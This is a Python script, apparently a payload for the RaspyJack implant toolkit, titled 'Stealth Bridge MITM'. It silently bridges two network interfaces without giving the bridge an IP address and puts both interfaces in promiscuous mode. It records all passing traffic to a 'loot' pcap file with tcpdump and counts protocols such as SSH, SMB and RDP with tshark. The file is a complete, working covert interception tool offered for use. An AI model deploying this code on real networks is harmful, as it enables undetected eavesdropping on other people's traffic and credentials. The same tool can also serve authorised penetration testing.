#!/usr/bin/env python3
# @name: Stealth Bridge MITM
# @desc: Stealth Bridge MITM payload.
# @category: network
# @danger: false
# @active: true
# @web: true
"""
RaspyJack Payload – Stealth Bridge MITM
---------------------------------------------------------
- Auto-detects 2 active interfaces (carrier=1)
- Creates a transparent bridge (br0) with NO IP (stealth)
- Starts tcpdump on br0 (PCAP)
- Live protocol counters via tshark

Controls
--------
  CLI  -- Run: python3 silent_bridge.py [duration_seconds]
          Interfaces are auto-detected (first two with carrier=1).
          Prints periodic protocol counters; Ctrl-C stops and cleans
          up the bridge. If duration_seconds is given, stops
          automatically after that many seconds.
"""

import os
import sys
import time
import subprocess
from datetime import datetime
import threading

# Ensure RaspyJack modules are importable
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

BRIDGE = "br0"
REFRESH_SEC = 5.0

# Live counters (tshark)
stats_lock = threading.Lock()
PROTO_LIST = [
    "DNS", "HTTP",
    "TLS", "ICMP",
    "ARP", "SMB",
    "FTP", "SSH",
    "DHCP", "NTP",
    "QUIC", "SMTP",
    "SNMP", "RDP",
]

proto_counts = {p: 0 for p in PROTO_LIST}


def _run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True)


def _read(path):
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except Exception:
        return ""


def _iface_has_carrier(name):
    carrier = _read(f"/sys/class/net/{name}/carrier")
    return carrier == "1"


def _iface_operstate(name):
    return _read(f"/sys/class/net/{name}/operstate")


def _iface_ip(name):
    res = _run(["ip", "-4", "addr", "show", "dev", name])
    if res.returncode != 0:
        return None
    for line in res.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1].split("/")[0]
    return None


def _list_active_ifaces():
    ifaces = []
    for name in os.listdir("/sys/class/net"):
        if name in ("lo", BRIDGE):
            continue
        if _iface_has_carrier(name):
            ifaces.append(name)
    return ifaces


def _sort_ifaces(ifaces):
    def score(n):
        if n.startswith("eth"):
            return 0
        if n.startswith("en"):
            return 1
        if n.startswith("usb"):
            return 2
        return 3
    return sorted(ifaces, key=lambda n: (score(n), n))


def print_stats(if1, if2):
    with stats_lock:
        counts = {k: proto_counts[k] for k in PROTO_LIST}
    summary = ", ".join(f"{p}={counts[p]}" for p in PROTO_LIST if counts[p])
    print(f"[{if1} <-> {if2}] {summary or 'no traffic yet'}", flush=True)


def ensure_bridge_cleanup(if1, if2):
    _run(["ip", "link", "set", BRIDGE, "down"])
    _run(["ip", "link", "del", BRIDGE])
    _run(["ip", "link", "set", if1, "down"])
    _run(["ip", "link", "set", if2, "down"])
    _run(["ip", "link", "set", if1, "up"])
    _run(["ip", "link", "set", if2, "up"])


def setup_bridge(if1, if2):
    # bring down and flush
    _run(["ip", "link", "set", if1, "down"])
    _run(["ip", "link", "set", if2, "down"])
    _run(["ip", "addr", "flush", "dev", if1])
    _run(["ip", "addr", "flush", "dev", if2])

    # create bridge
    _run(["ip", "link", "add", BRIDGE, "type", "bridge"])
    _run(["ip", "link", "set", if1, "master", BRIDGE])
    _run(["ip", "link", "set", if2, "master", BRIDGE])

    # promiscuous + up
    _run(["ip", "link", "set", if1, "promisc", "on"])
    _run(["ip", "link", "set", if2, "promisc", "on"])
    _run(["ip", "link", "set", if1, "up"])
    _run(["ip", "link", "set", if2, "up"])
    _run(["ip", "link", "set", BRIDGE, "up"])

    # stealth: no IP on bridge
    _run(["ip", "addr", "flush", "dev", BRIDGE])


def start_sniffer():
    loot_dir = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'MITM')
    os.makedirs(loot_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    pcap_file = f"{loot_dir}/stealth_bridge_{ts}.pcap"
    proc = subprocess.Popen(["tcpdump", "-i", BRIDGE, "-w", pcap_file])
    return proc, pcap_file


def start_tshark_stats():
    # tshark line-based summary
    cmd = [
        "tshark",
        "-l",
        "-i", BRIDGE,
        "-T", "fields",
        "-E", "separator=,",
        "-e", "_ws.col.Protocol",
    ]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)


def _map_proto(raw):
    p = raw.strip().upper()
    if "DNS" in p:
        return "DNS"
    if "HTTP" in p:
        return "HTTP"
    if "TLS" in p or "SSL" in p:
        return "TLS"
    if "ICMP" in p:
        return "ICMP"
    if "ARP" in p:
        return "ARP"
    if "SMB" in p or "NBSS" in p or "SMB2" in p:
        return "SMB"
    if "FTP" in p:
        return "FTP"
    if "SSH" in p:
        return "SSH"
    if "DHCP" in p or "BOOTP" in p:
        return "DHCP"
    if "NTP" in p:
        return "NTP"
    if "QUIC" in p:
        return "QUIC"
    if "SMTP" in p:
        return "SMTP"
    if "SNMP" in p:
        return "SNMP"
    if "RDP" in p:
        return "RDP"
    return None


def stats_loop(proc):
    if proc.stdout is None:
        return
    for line in proc.stdout:
        proto = _map_proto(line)
        if not proto:
            continue
        with stats_lock:
            proto_counts[proto] += 1


def main():
    duration = None
    if len(sys.argv) > 1:
        try:
            duration = float(sys.argv[1])
        except ValueError:
            print(f"Usage: {sys.argv[0]} [duration_seconds]", flush=True)
            return 1

    print("Stealth Bridge: detecting active interfaces...", flush=True)
    ifaces = _sort_ifaces(_list_active_ifaces())
    if len(ifaces) < 2:
        print("Need at least 2 active interfaces to build a bridge.", flush=True)
        return 1

    if1, if2 = ifaces[0], ifaces[1]
    ip1 = _iface_ip(if1) or "-"
    ip2 = _iface_ip(if2) or "-"
    print(f"IF1: {if1} (ip={ip1})", flush=True)
    print(f"IF2: {if2} (ip={ip2})", flush=True)

    print(f"Setting up stealth bridge {if1} <-> {if2}...", flush=True)
    setup_bridge(if1, if2)

    print("Starting tcpdump on br0 and tshark protocol stats...", flush=True)
    sniffer, output = start_sniffer()
    print(f"PCAP: {output}", flush=True)
    tshark_proc = start_tshark_stats()
    stats_thread = threading.Thread(target=stats_loop, args=(tshark_proc,), daemon=True)
    stats_thread.start()

    print("Bridge active. Press Ctrl-C to stop.", flush=True)
    start_time = time.time()
    try:
        while True:
            if duration is not None and (time.time() - start_time) >= duration:
                print("Duration elapsed, stopping.", flush=True)
                break
            print_stats(if1, if2)
            time.sleep(REFRESH_SEC)
    except KeyboardInterrupt:
        print("Interrupted, stopping.", flush=True)
    finally:
        print("Stopping capture and cleaning up bridge...", flush=True)
        try:
            sniffer.terminate()
            sniffer.wait(timeout=3)
        except Exception:
            pass
        try:
            tshark_proc.terminate()
            tshark_proc.wait(timeout=3)
        except Exception:
            pass
        ensure_bridge_cleanup(if1, if2)
        print_stats(if1, if2)
        print("Stealth bridge stopped.", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
